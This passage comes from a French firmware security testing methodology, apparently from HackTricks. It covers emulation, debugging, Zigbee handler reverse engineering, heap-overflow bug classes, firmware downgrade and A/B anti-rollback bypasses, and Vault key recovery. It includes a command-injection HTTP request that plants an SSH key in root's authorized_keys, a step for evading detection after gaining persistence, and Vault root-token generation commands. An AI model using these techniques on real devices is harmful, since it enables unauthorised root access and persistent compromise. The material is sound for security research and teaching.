qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Débogage hors ligne de l’état de l’image

Inspectez l’état persistant en dehors du guest lorsque des démarrages lents, des scripts de démarrage destructifs ou des journaux de console peu fiables masquent l’échec. N’attachez jamais un overlay utilisé par une VM en cours d’exécution ; exposez-le avec `qemu-nbd`, limitez la découverte LVM à la partition NBD prévue et désactivez le groupe de volumes avant de le déconnecter.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Pour isoler les pannes de manière reproductible, écrivez des fichiers marqueurs horodatés sur un volume inscriptible stable et vérifiez-les hors ligne ; `/dev/kmsg`, les FIFO et les consoles éphémères peuvent produire de faux négatifs en raison de la limitation du débit ou de l’arrêt prématuré du processus. Comparez aussi les interfaces exactes entre les couches avant de modifier du code sans rapport : `uname -r` par rapport à `/lib/modules/`, les fonctionnalités ext4 sur disque par rapport à la configuration du noyau, et la génération de `libGL` de Mesa par rapport à l’ABI du pilote DRI et aux noms de pilotes dérivés du PCI. Un composant peut être présent et même être chargé avec succès par `dlopen()` tout en restant inutilisable, car son consommateur attend une ABI différente.<sup>[[11]](#references)</sup>

## Analyse dynamique en pratique

À ce stade, un environnement d’appareil réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation peut ne pas reproduire parfaitement les interactions matérielles, ce qui peut nécessiter des redémarrages occasionnels de l’émulateur. L’analyse doit examiner à nouveau le système de fichiers, exploiter les pages web et services réseau exposés, et rechercher des vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour détecter d’éventuelles vulnérabilités de type backdoor.

## Techniques d’analyse à l’exécution

L’analyse à l’exécution consiste à interagir avec un processus ou un binaire dans son environnement d’exécution, à l’aide d’outils comme gdb-multiarch, Frida et Ghidra pour définir des points d’arrêt et détecter des vulnérabilités par fuzzing et d’autres techniques.

Pour les cibles embarquées sans débogueur complet, **copiez un `gdbserver` lié statiquement** sur l’appareil et connectez-vous-y à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapping des messages Zigbee / radio-co-processeur

Sur les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Un workflow utile consiste à cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** transmise par radio
2. **Analyseur côté contrôleur** sur le MCU radio
3. **Protocole texte série/UART ou TLV** transmis à Linux (par exemple `/dev/tty*`)
4. **Dispatcher de l’application** dans le daemon principal
5. **Gestionnaire spécifique au protocole / machine à états**

Cette architecture crée deux cibles de rétro-ingénierie au lieu d’une. Si le contrôleur convertit les trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, identifiez :

- Les **groupes de messages** et les tables de dispatch
- Les messages qui peuvent provenir du **réseau** par opposition au contrôleur lui-même
- Les champs discriminateurs exacts **spécifiques au fabricant** (par exemple Zigbee `manufacturer_code` et `cluster_command` personnalisé)
- Les gestionnaires qui ne sont accessibles que pendant les phases de **commissioning**, de découverte ou de téléchargement de firmware/modèle

Pour Zigbee en particulier, capturez le trafic d’appairage et vérifiez si la cible utilise encore la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’interception du trafic de commissioning peut révéler la **Network Key**. Les install codes de Zigbee 3.0 réduisent cette exposition ; vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles spécifiques au fabricant et accessibilité contrôlée par une FSM

Les commandes Zigbee/ZCL spécifiques au fabricant sont souvent de meilleures cibles que les clusters standardisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes dont la validation est moins éprouvée.<sup>[[8]](#references)</sup>

Workflow pratique :

- Effectuez la rétro-ingénierie du dispatcher de commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Retrouvez les tables **d’état de la FSM**, **d’événements**, **de vérifications**, **d’actions** et **d’états suivants**.
- Identifiez les **états transitoires** qui avancent automatiquement, ainsi que les branches de nouvelle tentative et d’erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez les échanges de protocole légitimes nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le gestionnaire bogué est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une approche plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de niveau fabricant, afin d’exposer les **endpoints**, les **attributs** et le timing de commissioning appropriés.

### Classe de bugs liée aux téléchargements fragmentés dans les daemons embarqués

Une classe de bugs récurrente dans les firmwares concerne les **téléchargements fragmentés de blob/modèle/configuration** :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **locaux au paquet** contrôlés par l’attaquant, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier que la taille ne dépasse pas la **taille allouée initialement**.

Cela permet à un attaquant d’envoyer :

- Un premier fragment valide avec une taille totale déclarée **faible** afin de provoquer une petite allocation sur le heap.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille locale au paquet falsifiée qui satisfait les nouvelles vérifications tout en débordant le buffer alloué initialement.

Lorsque le chemin vulnérable est derrière la logique de commissioning, l’exploitation doit inclure suffisamment **d’émulation d’appareil** pour faire passer la cible à l’état attendu de téléchargement de modèle ou de blob avant d’envoyer les fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher l’exploitation des métadonnées du heap consiste souvent non pas à « attendre le nettoyage », mais à **forcer la gestion d’erreur propre au protocole** :<sup>[[8]](#references)</sup>

- Envoyez des fragments de suivi malformés pour faire passer la FSM dans les états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de tentatives afin que le daemon **réinitialise le contexte** et libère le buffer corrompu.
- Utilisez ce `free()` prévisible pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette méthode est particulièrement utile contre les allocateurs de type **musl/uClibc/dlmalloc** sous Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Un schéma stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers de **faux chunks placés dans le buffer débordé**, au lieu d’écraser immédiatement les pointeurs de bins réels et de faire planter le processus.

## Exploitation binaire et preuve de concept

Le développement d’une PoC pour les vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture cible et de la programmation dans des langages de bas niveau. Les protections d’exécution binaire sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme le Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins + consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation importante ultérieure peut déclencher `__malloc_consolidate()` ; tout faux chunk doit donc résister aux vérifications (taille cohérente, `fd = 0` et chunks voisins considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire sont stables. Vous pouvez cibler une région qui ressemble déjà à un en-tête de chunk valide du heap afin de faire aboutir une allocation fastbin sur une **table de pointeurs de fonction**.
- **NUL qui arrête l’analyseur :** lorsque le JSON est analysé, un `\x00` dans le payload peut arrêter l’analyse tout en conservant les octets contrôlés par l’attaquant qui suivent, pour un pivot de pile/une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut placer du shellcode exécutable dans une zone mémoire connue et lui transférer l’exécution.

## Systèmes d’exploitation prêts à l’emploi pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour tester la sécurité des firmwares, équipés des outils nécessaires.

## Systèmes d’exploitation prêts à l’emploi pour analyser les firmwares

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à évaluer la sécurité et à effectuer des tests d’intrusion sur les appareils de l’Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation pour les tests de sécurité des systèmes embarqués, basé sur Ubuntu 18.04 et préchargé avec des outils de test de sécurité des firmwares.

## Attaques par downgrade de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fabricant met en œuvre des vérifications de signature cryptographique pour les images de firmware, la **protection contre le rollback de version (downgrade)** est souvent omise. Lorsque le chargeur de démarrage ou de récupération vérifie uniquement la signature à l’aide d’une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image installée, un attaquant peut installer légitimement un **ancien firmware vulnérable portant toujours une signature valide** et ainsi réintroduire des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Workflow d’attaque typique :

1. **Obtenir une ancienne image signée**
   * La récupérer sur le portail de téléchargement public du fabricant, son CDN ou son site d’assistance.
   * L’extraire des applications mobiles/de bureau associées (par exemple dans `assets/firmware/` d’un APK Android).
   * La récupérer dans des dépôts tiers comme VirusTotal, des archives Internet, des forums, etc.
2. **Téléverser ou fournir l’image à l’appareil** par un canal de mise à jour exposé :
   * Interface Web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *non authentifiés* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent la récupération/la mise à niveau.
3. Après le downgrade, exploiter une vulnérabilité corrigée dans une version plus récente (par exemple un filtre contre l’injection de commandes ajouté ultérieurement).
4. Si nécessaire, réinstaller la dernière image ou désactiver les mises à jour pour éviter d’être détecté après avoir obtenu la persistance.

### Exemple : injection de commandes après un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est concaténé directement à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, pour activer un accès root par clé SSH). Les versions ultérieures du firmware ont ajouté un filtre élémentaire de caractères, mais l’absence de protection contre la rétrogradation rend ce correctif inutile.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fournisseurs intègrent des images complètes du firmware dans leurs applications mobiles associées afin que celles-ci puissent mettre à jour l’appareil par Bluetooth/Wi-Fi. Ces paquets sont généralement stockés sans chiffrement dans l’APK/APEX, dans des chemins comme `assets/fw/` ou `res/raw/`. Des outils tels que `apktool`, `ghidra`, ou même le simple utilitaire `unzip`, permettent d’extraire des images signées sans toucher au matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rollback limité à l’updater dans les conceptions à slots A/B

Certains fournisseurs implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS sur CAN, une commande de récupération ou un agent OTA en espace utilisateur). Si le **bootloader** vérifie ensuite uniquement la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées du slot, la protection contre le rollback peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception faible typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **ratchet de sécurité** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée dans le stockage persistant et rejette les anciennes images signées.
- Le bootloader n’analyse **pas** ce ratchet et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est enregistrée séparément dans une table de partitions ou un compteur de génération propre à chaque slot et n’est **pas liée cryptographiquement** au condensat exact du firmware validé.

Cela crée une primitive **valider une image / en démarrer une autre** dans les systèmes à double slot. Si l’attaquant peut faire désigner le slot B par l’updater comme prochaine cible de démarrage à l’aide d’une image signée actuelle, puis écraser le slot B avant le redémarrage, le bootloader peut tout de même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées du slot déjà enregistrées.

Schéma d’abus courant :

1. Téléverser un firmware **actuel signé** dans le slot passif et exécuter la routine normale de validation/basculement afin que la configuration désigne ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot dans la même session.
3. Exploiter un état de démarrage obsolète ou une logique de sélection de slot obsolète afin que l’updater efface le **même slot physique** qui vient d’être promu.
4. Écrire un firmware **plus ancien, mais toujours signé** dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/intégrité et démarre l’ancienne image.

Points à examiner lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- Sélection du slot basée sur des **indicateurs de démarrage** qui ne sont pas actualisés après un basculement réussi.
- Routine de type `prepare_passive_slot()` qui efface un slot en fonction d’un état obsolète plutôt que de la **configuration actuellement enregistrée**.
- Fonction de type `part_write_layout()` qui ne fait qu’incrémenter un **compteur de génération** / indicateur actif et n’enregistre pas le hachage de l’image validée.
- Vérifications du ratchet implémentées en espace utilisateur ou dans le code de l’updater, mais **pas** dans la ROM / le bootloader / les étapes de démarrage sécurisé.
- Routines d’effacement ou de récupération qui laissent le slot marqué comme démarrable même après que son contenu a été supprimé puis réécrit.

### Liste de contrôle pour évaluer la logique de mise à jour

* Le transport et l’authentification du *point de terminaison de mise à jour* sont-ils suffisamment protégés (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur anti-rollback monotone** avant le flashage ?
* L’image est-elle vérifiée dans une chaîne de démarrage sécurisé (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au condensat/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après la réussite d’un basculement de slot, l’appareil est-il forcé de redémarrer, ou d’autres routines de mise à jour/d’effacement restent-elles accessibles au cours de la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications de cohérence supplémentaires (par exemple, table de partitions autorisée, numéro de modèle) ?
* Les flux de mise à jour *partiels* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques par rollback.

## Firmwares vulnérables pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans les firmwares, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération de clés de déchiffrement de firmware à partir de l’état KMS/Vault intégré

Lorsqu’une image de mise à jour mélange de petites métadonnées en clair avec un gros bloc à forte entropie, analysez d’abord le conteneur avant de tenter une attaque par force brute :<sup>[[1]](#references)</sup>

- Relevez les en-têtes, les offsets et les limites de lignes avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format OpenSSL `enc` : les 8 octets suivants correspondent au sel et les octets restants au texte chiffré.
- Un champ Base64 qui se décode en exactement `256` octets indique fortement qu’il s’agit d’un texte chiffré RSA-2048 contenant un mot de passe de firmware ou une clé de session aléatoire.
- Un contenu PGP détaché dans le même fichier protège souvent uniquement l’authenticité ; ne supposez pas qu’il s’agit du mécanisme de confidentialité.

Si la recherche de clés statiques (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingéniez plutôt le **parcours de déchiffrement opérationnel** au lieu de rechercher uniquement des clés privées :

- Décompilez le binaire de l’updater/de gestion et suivez le code pour déterminer qui lit le blob chiffré, quel helper/API le déchiffre et quel nom de clé logique est demandé.
- Recherchez dans le système de fichiers racine extrait l’état KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les fichiers d’unités et les scripts d’initialisation.
- Considérez le texte en clair `vault operator unseal ...`, les clés de récupération, les jetons d’amorçage ou les scripts locaux de déverrouillage automatique du KMS comme des équivalents de matériel de clé privée.

Si l’appliance fournit le binaire Vault d’origine et son backend de stockage, rejouer cet environnement est généralement plus simple que de réimplémenter les mécanismes internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec les privilèges root sur le KMS cloné :

- Rendez les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé de déchiffrement : `vault read transit/export/encryption-key/<name>`
- Essayez la clé RSA récupérée avec la paire exacte de padding et de hash utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux utilisant Vault emploient OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si la charge utile commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fabricant (`EVP_BytesToKey`, souvent MD5 sur les anciens appareils) avant de tenter le déchiffrement AES-CBC.

Le problème de « firmware chiffré » devient ainsi plus général : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déchiffrement et du KDF**.

## Formations et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracker le firmware avec Claude : compétences de niveau senior, autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité du firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratique du hacking IoT : le guide définitif pour attaquer l’Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero-days dans du matériel abandonné – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m’a donné accès à votre maison](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant, vous voyez mi : maintenant, vous êtes pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiter le Tesla Wall Connector depuis son connecteur de port de charge - Partie 2 : contourner la protection anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faites-le clignoter : exploitation over-the-air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS sur QEMU, partie 1 : dépaquetage](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentation du noyau Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS sur QEMU, partie 2 : débogage et correction](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Mots de passe du BIOS Dell : le faible chiffrement XOR permet leur récupération depuis la mémoire flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Outils de récupération des mots de passe du BIOS Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Révisions des bases du hacking matériel, partie 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Comment et pourquoi nous avons hacké le portefeuille matériel Cypherock : toute l’histoire](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
